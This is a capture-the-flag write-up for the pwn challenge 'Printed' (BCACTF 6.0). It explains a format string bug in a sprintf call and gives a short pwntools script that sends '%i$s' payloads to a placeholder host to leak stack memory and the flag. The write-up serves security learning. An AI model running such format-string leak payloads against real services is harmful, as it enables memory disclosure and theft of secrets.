# Printed — Writeup

**Category:** *pwn*

## Solution

The following C source code was provided:

<p align="center">
<img src="../resources/BCACTF 6.0/Printed1.png" alt="The source code"/>
</p>

I noticed a possble **format string** vulnerability in the `show` function. The `sprintf` call used the **name** input directly, which allowed me to inject format specifiers and potentially read adjacent memory, including the flag. Because the flag is string data that is not given as an argument, the specifier `%n$s` attempts to access the _n_-th argument. Since that argument was never provided, it reads whatever is located at the position where the _n_-th argument **would be** on the stack, potentially leaking data from memory:

<p align="center">
<img src="../resources/BCACTF 6.0/Printed2_0.png" alt="Attempt with SIGSEGV"/>
</p>
<p align="center">
<img src="../resources/BCACTF 6.0/Printed2_1.png" alt="Attempt with data access"/>
</p>

To exploit the target program and get the flag from the host I wrote the following script:

```python
from pwn import *

context.log_level = 'error'

for i in range(1, 100):
	try:
		p = remote('example.com', 1234)
		payload = f'%{i}$s'.encode()
		p.sendline(payload)
		ans = p.recvline()
		print(ans.decode(errors='ignore'))
	except Exception:
		print('nothing')
		
	p.close()
	sleep(0.2)
```

Using this method, I was able to retrieve the flag:

<p align="center">
<img src="../resources/BCACTF 6.0/Printed3.png" alt="The flag"/>
</p>
